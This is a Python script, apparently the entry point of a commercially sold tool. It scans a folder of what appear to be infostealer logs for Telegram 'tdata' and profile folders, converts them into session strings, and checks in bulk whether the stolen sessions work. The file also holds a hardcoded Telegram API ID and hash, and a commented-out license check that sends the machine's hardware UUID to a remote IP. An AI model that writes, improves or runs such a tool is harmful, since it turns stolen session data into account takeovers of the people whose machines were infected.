from getpass import getpass
from asyncio import get_event_loop, gather, Semaphore, sleep
from loguru import logger
from os import walk, path, system
from convert_tdata import convert_tdata
import warnings
from getpass import getpass
from checker import check_sess
from xuy import Result
from typing import List
from results import saver

from secrets import token_hex
from subprocess import check_output
from cryptography.fernet import Fernet
from sys import exit
from json import dumps
from aiohttp import ClientSession





API_ID = 17463049
API_HASH = "bd4bbac77f54cd096ede52dd2e8e2e50"

warnings.filterwarnings("ignore", category=DeprecationWarning)
        


async def main() -> None:
    # TODO: поддержку прокси
    # proxy_connector = ProxyConnector()
    # with open('proxies.txt') as f:
    #     proxies = f.read().split('\n')


    # print('Checking License...')

    # license -----------------------
    # fernet = Fernet('2mNhm1s6F_Fn4wOgOxIbtWpgZs2Dl6tMzSF4gStVW4U=')
    # token = token_hex(8)

    # data = {
    #     'token': token,
    #     'uuid': check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    # }

    # encrypted_data = fernet.encrypt(dumps(data).encode()).decode()

    # req_data = {
    #     'encrypted_data': encrypted_data
    # }

    # async with ClientSession() as s:
    #     async with s.post('http://144.24.115.170:9090/license', json=req_data) as res:
    #         data = await res.json()
    #         license = data['license']

    #         if license != token:
    #             print('Buy soft! t.me/gachidev')
    #             system('start tg://gachidev')
    #             return exit()
    # license end -----------------------
    
    logs_path = input('Paste the path to the log folder or drag it to the console: ').strip('" \'\t')
    threads = int(input('Enter the number of threads (optimally 10): '))


    sem = Semaphore(threads)

    logger.info('Create folders for check results')
    await saver.create_all()
    
    logger.info('starting looking for folders called "tdata"')
    tdatas = []
    for dirpath, dirnames, filenames in walk(logs_path):
        folder_name = path.split(dirpath)[1]
        if folder_name == 'tdata' or 'Profile_' in folder_name:
            tdatas.append(dirpath)

    logger.info(f'Found {len(tdatas)} tdata, start converting to sessions')
    string_sessions = {}
    for tdata in tdatas:
        try:
            for s in convert_tdata(tdata):
                string_sessions[s] = tdata
        except Exception:
            continue
    
    logger.info(f'Found {len(string_sessions)} sessions, starting check')
    tasks = (check_sess(p, s, sem) for s, p in string_sessions.items())
    results: List[Result] = await gather(*tasks, return_exceptions=False)
    

if __name__ == '__main__':
    try:
        loop = get_event_loop()
        loop.run_until_complete(main())
    except Exception as e:
        logger.exception(e)

    logger.info('Press enter to close window...')
    getpass('')